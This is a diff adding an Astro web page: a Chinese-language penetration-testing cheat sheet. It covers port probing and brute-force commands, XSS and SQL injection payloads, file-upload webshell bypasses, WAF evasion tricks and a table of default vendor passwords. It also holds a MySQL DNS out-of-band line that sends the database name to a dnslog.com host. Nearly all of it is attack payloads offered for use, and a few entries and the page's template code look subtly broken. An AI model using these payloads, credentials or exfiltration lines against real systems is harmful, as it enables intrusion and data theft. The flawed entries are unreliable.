@@ -1,0 +1,209 @@
+---
+import BaseHead from '../../components/BaseHead.astro';
+import Header from '../../components/Header.astro';
+import Footer from '../../components/Footer.astro';
+import { SITE_TITLE } from '../../consts';
+---
+
+<!doctype html>
+<html lang="zh-CN">
+<head>
+	<BaseHead title="速查表 - " + SITE_TITLE} description="网络安全速查表，XSS/SQL注入/端口/WAF绕过等" />
+	<style>
+		.hero { padding: 3em 0 2em; border-bottom: 1px solid var(--border-color); margin-bottom: 2em; }
+		.hero h1 { color: var(--accent); font-size: 2em; margin-bottom: 0.5em; }
+		.hero p { color: rgb(var(--gray)); }
+		.count-badge { display: inline-block; padding: 2px 12px; border-radius: 20px; background: rgba(0,212,170,0.1); border: 1px solid rgba(0,212,170,0.3); color: var(--accent); font-size: 0.85em; margin-bottom: 1em; }
+		.cheat-card { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; padding: 1.5em; margin-bottom: 1.5em; }
+		.cheat-title { font-size: 1.1em; font-weight: 700; color: var(--accent); margin-bottom: 0.5em; display: flex; align-items: center; gap: 0.5em; }
+		.cheat-desc { color: rgb(var(--gray)); font-size: 0.85em; margin-bottom: 1em; }
+		.code-block { background: var(--code-bg); border: 1px solid var(--border-color); border-radius: 8px; padding: 1em 1.2em; overflow-x: auto; margin-bottom: 0.8em; }
+		.code-block code { background: none; border: none; padding: 0; color: rgb(var(--black)); font-size: 13px; font-family: "Fira Code","Cascadia Code",Consolas,monospace; white-space: pre; }
+		.cheat-table { width: 100%; border-collapse: collapse; font-size: 0.85em; }
+		.cheat-table th { background: rgba(0,212,170,0.08); color: var(--accent); padding: 0.7em 1em; text-align: left; border-bottom: 1px solid var(--border-color); }
+		.cheat-table td { padding: 0.6em 1em; border-bottom: 1px solid var(--border-color); vertical-align: top; color: rgb(var(--gray)); }
+		.cheat-table code { font-size: 0.88em; }
+		.cheat-table tr:hover td { background: rgba(0,212,170,0.03); }
+	</style>
+</head>
+<body>
+	<Header />
+	<main>
+		<div class="hero">
+			<span class="count-badge">📋 速查表 · 实用参考</span>
+			<h1>📋 安全速查表</h1>
+			<p>渗透测试和漏洞利用过程中常用Payload、Bypass技巧、端口服务的快速参考卡片。</p>
+		</div>
+
+		<!-- 端口速查 -->
+		<div class="cheat-card">
+			<div class="cheat-title">🔌 常见端口速查表</div>
+			<div class="cheat-desc">渗透测试中常用的端口及对应的服务漏洞探测方法</div>
+			<table class="cheat-table">
+				<thead><tr><th>端口</th><th>服务</th><th>漏洞/利用方式</th><th>探测命令</th></tr></thead>
+				<tbody>
+					<tr><td><code>21</code></td><td>FTP</td><td>匿名访问/弱口令/VSFTPD后门</td><td><code>ftp 10.0.0.1</code></td></tr>
+					<tr><td><code>22</code></td><td>SSH</td><td>弱口令/密钥泄露/Sudo提权</td><td><code>ssh root@10.0.0.1</code></td></tr>
+					<tr><td><code>23</code></td><td>Telnet</td><td>明文传输/弱口令/爆破</td><td><code>hydra -l admin -P pass.txt telnet://10.0.0.1</code></td></tr>
+					<tr><td><code>25</code></td><td>SMTP</td><td>邮件伪造/用户枚举</td><td><code>nc 10.0.0.1 25</code></td></tr>
+					<tr><td><code>53</code></td><td>DNS</td><td>DNS区域传输/DNS欺骗/DNS隧道</td><td><code>dig axfr @10.0.0.1 target.com</code></td></tr>
+					<tr><td><code>80/443</code></td><td>HTTP/S</td><td>Web漏洞/旁站/子域名</td><td><code>nmap -p80,443 --script=http-enum 10.0.0.1</code></td></tr>
+					<tr><td><code>111</code></td><td>NFS</td><td>NFS未授权访问/文件读取</td><td><code>showmount -e 10.0.0.1</code></td></tr>
+					<tr><td><code>135</code></td><td>MSRPC</td><td>445探测/内网横向</td><td><code>rpcclient -U "" 10.0.0.1</code></td></tr>
+					<tr><td><code>139/445</code></td><td>SMB</td><td>SMB溢出/弱口令/永恒之蓝</td><td><code>enum4linux 10.0.0.1</code></td></tr>
+					<tr><td><code>1433</code></td><td>MSSQL</td><td>弱口令/xp_cmdshell</td><td><code>sqsh -H 10.0.0.1 -U sa</code></td></tr>
+					<tr><td><code>1521</code></td><td>Oracle</td><td>弱口令/TNS投毒</td><td><code>sqlplus scott/tiger@10.0.0.1:1521/orcl</code></td></tr>
+					<tr><td><code>2049</code></td><td>NFS</td><td>NFS共享未授权</td><td><code>mount -t nfs 10.0.0.1:/ /mnt</code></td></tr>
+					<tr><td><code>3306</code></td><td>MySQL</td><td>弱口令/udf提权/日志写shell</td><td><code>mysql -h 10.0.0.1 -u root -p</code></td></tr>
+					<tr><td><code>3389</code></td><td>RDP</td><td>弱口令/BlueKeep/CVE-2019-0708</td><td><code>rdesktop 10.0.0.1</code></td></tr>
+					<tr><td><code>5432</code></td><td>PostgreSQL</td><td>弱口令/命令执行/rcopy</td><td><code>psql -h 10.0.0.1 -U postgres</code></td></tr>
+					<tr><td><code>5900</code></td><td>VNC</td><td>弱口令/无认证访问</td><td><code>vncviewer 10.0.0.1:5900</code></td></tr>
+					<tr><td><code>6379</code></td><td>Redis</td><td>未授权访问/写webshell/ssh-key</td><td><code>redis-cli -h 10.0.0.1</code></td></tr>
+					<tr><td><code>8080</code></td><td>HTTP Proxy</td><td>Tomcat/Resin/JBoss/弱口令</td><td><code>nmap -p8080 --script=http-enum 10.0.0.1</code></td></tr>
+					<tr><td><code>9200</code></td><td>Elasticsearch</td><td>未授权访问/代码执行</td><td><code>curl http://10.0.0.1:9200</code></td></tr>
+					<tr><td><code>27017</code></td><td>MongoDB</td><td>未授权访问</td><td><code>mongo 10.0.0.1:27017</code></td></tr>
+				</tbody>
+			</table>
+		</div>
+
+		<!-- XSS Payload -->
+		<div class="cheat-card">
+			<div class="cheat-title">💥 XSS Payload 速查</div>
+			<div class="cheat-desc">常见XSS注入Payload及绕过方式</div>
+			<div class="code-block"><code>&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+&lt;iframe src="javascript:alert(1)"&gt;
+&lt;body onload=alert(1)&gt;
+&lt;input autofocus onfocus=alert(1)&gt;
+&lt;select onfocus=alert(1) autofocus&gt;
+&lt;textarea autofocus onfocus=alert(1)&gt;
+&lt;keygen autofocus onfocus=alert(1)&gt;
+&lt;video&gt;&lt;source onerror=alert(1)&gt;
+&lt;audio src=x onerror=alert(1)&gt;
+&lt;details open ontoggle=alert(1)&gt;
+&lt;marquee onstart=alert(1)&gt;</code></div>
+			<div class="cheat-title" style="margin-top:1em;font-size:0.95em;">XSS 绕过技巧</div>
+			<table class="cheat-table">
+				<thead><tr><th>原始</th><th>绕过方式</th><th>示例</th></tr></thead>
+				<tbody>
+					<tr><td><code>&lt;script&gt;</code></td><td>大小写混合</td><td><code>&lt;ScRiPt&gt;</code></td></tr>
+					<tr><td><code>script</code></td><td>标签嵌套</td><td><code>&lt;scr&lt;script&gt;ipt&gt;</code></td></tr>
+					<tr><td><code>onerror</code></td><td>编码绕过</td><td><code>onerr&#111;r</code></td></tr>
+					<tr><td><code>alert</code></td><td>Unicode/JSEscape</td><td><code>\u0061lert</code></td></tr>
+					<tr><td><code>event</code></td><td>HTML实体</td><td><code>&#111;nclick=</code></td></tr>
+					<tr><td><code>javascript:</code></td><td>空格替代</td><td><code>java&lt;script&gt;:alert(1)</code></td></tr>
+				</tbody>
+			</table>
+		</div>
+
+		<!-- SQL注入 -->
+		<div class="cheat-card">
+			<div class="cheat-title">💉 SQL注入 Payload 速查</div>
+			<div class="cheat-desc">常见SQL注入检测与利用Payload</div>
+			<div class="code-block"><code>// 基础检测
+' OR '1'='1
+" OR "1"="1
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+
+// Union注入
+' UNION SELECT null--
+' UNION SELECT 1,2,3--
+' UNION SELECT null,null,null FROM dual--
+
+// 报错注入
+' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--
+' AND UPDATEXML(1,CONCAT(0x7e,user()),1)--
+
+// 布尔盲注
+' AND 1=1--
+' AND 1=2--
+' AND ASCII(SUBSTRING((SELECT database()),1,1))&gt;64--
+
+// 时间盲注
+' AND SLEEP(5)--
+' AND IF(1=1,SLEEP(5),0)--
+' AND BENCHMARK(5000000,MD5('a'))--
+
+// DNS外带(MySQL)
+' AND LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.dnslog.com\\foo'))--</code></div>
+		</div>
+
+		<!-- 文件上传绕过 -->
+		<div class="cheat-card">
+			<div class="cheat-title">📤 文件上传绕过速查</div>
+			<div class="cheat-desc">WebShell上传绕过黑名单/白名单的各种技巧</div>
+			<table class="cheat-table">
+				<thead><tr><th>绕过类型</th><th>方法</th><th>示例</th></tr></thead>
+				<tbody>
+					<tr><td>00截断</td><td>HEX修改空格为00</td><td><code>shell.php%00.jpg</code></td></tr>
+					<tr><td>MIME绕过</td><td>Content-Type改image/jpeg</td><td><code>Content-Type: image/jpeg</code></td></tr>
+					<tr><td>大小写绕过</td><td>asp→ASP/pht</td><td><code>shell.ASP</code></td></tr>
+					<tr><td>双写绕过</td><td>pphphp(过滤后变php)</td><td><code>shell.pphphp</code></td></tr>
+					<tr><td>::$DATA</td><td>Windows流绕过</td><td><code>shell.php::$DATA</code></td></tr>
+					<tr><td>Apache解析</td><td>test.php.xxx</td><td><code>shell.php.xxx</code></td></tr>
+					<tr><td>.htaccess</td><td>上传htaccess解析jpg</td><td><code>AddType application/x-httpd-php .jpg</code></td></tr>
+					<tr><td>图片马</td><td>copy 1.jpg/b + shell.php/a shell.jpg</td><td><code>copy b.jpg/a + a.php/b c.jpg</code></td></tr>
+					<tr><td>SVG XSS</td><td>SVG内嵌script</td><td><code>&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></td></tr>
+				</tbody>
+			</table>
+		</div>
+
+		<!-- WAF绕过 -->
+		<div class="cheat-card">
+			<div class="cheat-title">🛡️ WAF绕过速查</div>
+			<div class="cheat-desc">常见WAF检测绕过技巧（仅供安全测试使用）</div>
+			<div class="code-block"><code>// SQL注入 WAF绕过
+UNION/**/SELECT     →  UNION/**/SELECT/**/1,2,3
+OR 1=1              →  ||1=1
+AND 1=1             →  &&1=1
+SLEEP(5)            →  SLEEP(5)/*f*/OR/*f*/1=1
+UNION SELECT        →  UNI/**/ON SEL/**/ECT
+admin'--             →  admin'/**/--%0a
+
+// 关键字替换
+information_schema   →  sys.x$processlist / mysql.innodb_table_stats
+BENCHMARK            →  SLEEP / WAITFOR
+LOAD_FILE            →  INTO DUMPFILE / SELECT LOAD_FILE
+
+// 注释混淆
+SELECT * FROM users WHERE id=1
+→ SELECT/*x*/*/*y*/FROM/*z*/users/**/WHERE/**/id=1
+
+// 内联注释 MySQL
+/*!50000 SELECT*/  ← MySQL版本>5.00时执行
+/*!UNION*/ /*!SELECT*/</code></div>
+		</div>
+
+		<!-- 弱口令 -->
+		<div class="cheat-card">
+			<div class="cheat-title">🔑 常见弱口令/默认口令</div>
+			<div class="cheat-desc">设备/系统/后台常见默认密码</div>
+			<table class="cheat-table">
+				<thead><tr><th>系统/设备</th><th>默认用户名</th><th>默认密码</th></tr></thead>
+				<tbody>
+					<tr><td>Weblogic</td><td>weblogic</td><td>weblogic1 / welcome1</td></tr>
+					<tr><td>Tomcat</td><td>tomcat</td><td>tomcat / manager</td></tr>
+					<tr><td>phpMyAdmin</td><td>root</td><td>(空) / root</td></tr>
+					<tr><td>Jenkins</td><td>admin</td><td>admin / password</td></tr>
+					<tr><td>GitLab</td><td>root</td><td>5iveL!fe</td></tr>
+					<tr><td>Nexus</td><td>admin</td><td>admin123</td></tr>
+					<tr><td>Kibana</td><td>elastic</td><td>changeme</td></tr>
+					<tr><td>Redis</td><td>(无)</td><td>(无密码)</td></tr>
+					<tr><td>MongoDB</td><td>(无)</td><td>(无密码)</td></tr>
+					<tr><td>Zabbix</td><td>Admin</td><td>zabbix</td></tr>
+					<tr><td>Cacti</td><td>admin</td><td>admin</td></tr>
+					<tr><td>宝塔面板</td><td>bt</td><td>(安装时设置)</td></tr>
+					<tr><td>齐治堡垒机</td><td>shterm</td><td>shterm</td></tr>
+					<tr><td>深信服VPN</td><td>admin</td><td>admin</td></tr>
+					<tr><td>通达OA</td><td>admin</td><td>(安装时设置)</td></tr>
+				</tbody>
+			</table>
+		</div>
+
+	</main>
+	<Footer />
+</body>
+</html>
